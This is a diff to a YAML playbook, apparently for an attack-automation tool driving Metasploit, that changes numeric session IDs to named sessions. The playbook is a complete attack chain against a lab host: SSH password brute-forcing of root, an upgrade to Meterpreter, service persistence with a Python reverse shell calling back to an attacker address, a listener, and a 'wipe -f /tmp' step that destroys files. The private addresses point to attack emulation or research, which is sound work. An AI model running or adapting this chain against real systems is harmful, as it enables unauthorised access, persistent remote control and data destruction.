@@ -2,11 +2,12 @@ commands:
 
   - type: msf-module
     cmd: "auxiliary/scanner/ssh/ssh_login"
+    creates_session: ssh_login
     options:
       RHOSTS: "192.168.56.181"
       RPORT: "22"
       USERNAME: "root"
-      PASS_FILE: "/home/ahnafrr/Desktop/attackmate/unix_passwords_modified.txt"
+      PASS_FILE: "/home/ahnafrr/Desktop/msf/unix_passwords_modified.txt"
       
   - type: sleep
     seconds: 15
@@ -26,8 +27,8 @@ commands:
       
   - type: msf-module
     cmd: "post/multi/manage/shell_to_meterpreter"
-    options:
-      SESSION: "1"
+    session: ssh_login
+    creates_session: meterpreter
       
   - type: sleep
     seconds: 15
@@ -36,16 +37,21 @@ commands:
   - type: msf-module
     cmd: "exploit/linux/local/service_persistence"
     payload: "cmd/unix/reverse_python"
+    session: ssh_login
+    creates_session: service_persistence
     payload_options:
       LHOST: "192.168.56.191"
     options:
-      SESSION: "1"
       VERBOSE: "true"
-      
-  - type: shell
-    cmd: "sessions -k 1,2,3"
-    description: "Kill session 1, 2, 3"
-    
+
+  - type: msf-session
+    session: "ssh_login"
+    cmd: "exit"
+
+  - type: msf-session
+    session: "meterpreter"
+    cmd: "exit"
+ 
   - type: sleep
     seconds: 15
     description: "Sleep 15 seconds"
@@ -53,10 +59,11 @@ commands:
   - type: msf-module
     cmd: "exploit/multi/handler"
     payload: "cmd/unix/reverse_python"
+    session: service_persistence
+    creates_session: handler_session
     payload_options:
       LHOST: "192.168.56.191"
     options:
-      SESSION: "4"
       VERBOSE: "true"
       
   - type: sleep
@@ -65,8 +72,8 @@ commands:
     
   - type: msf-session
     cmd: "apt install wipe -y"
-    session: "4"
+    session: handler_session
     
   - type: msf-session
     cmd: "wipe -f /tmp"
-    session: "4"
+    session: handler_session
